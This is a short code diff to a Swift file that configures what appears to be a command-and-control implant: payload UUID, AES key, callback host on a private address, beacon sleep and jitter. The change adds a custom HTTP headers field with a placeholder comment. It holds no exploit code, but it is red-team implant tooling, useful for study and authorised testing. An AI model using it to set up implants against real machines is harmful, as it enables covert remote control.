@@ -21,6 +21,7 @@ struct AgentConfig {
     var hostHeader: String
     var useSSL: Bool
     var queryParameter: String
+    var httpHeaders: Dictionary<String,String>
     
     // Agent components
     var sleep: Int32
@@ -29,8 +30,8 @@ struct AgentConfig {
 }
 
 var agentConfig = AgentConfig(
-    payloadUUID: "4c601578-9123-4db3-bf76-281b4c361a6c",
-    encodedAESKey: "XXjENt7hXJWlAh7grhstMle5XeK7b2C3uvBXXwF3hlM=",
+    payloadUUID: "2e11f9ce-d0e9-4fd9-a430-ad13a36c0a9f",
+    encodedAESKey: "7hJCPdER9+t3q3K5q3erbK/8H+co3Nat8uay3suFMu4=",
 
     callbackHost: "192.168.196.3",
     getRequestURI: "/index",
@@ -40,6 +41,7 @@ var agentConfig = AgentConfig(
     hostHeader: "",
     useSSL: false,
     queryParameter: "q",
+    httpHeaders: ["key1":"value1","key2":"value2"], //use [:] for empty, so config.swift.bak might be REPLACE_HTTP_HEADERS:
 
     sleep: 5,
     jitter: 5,
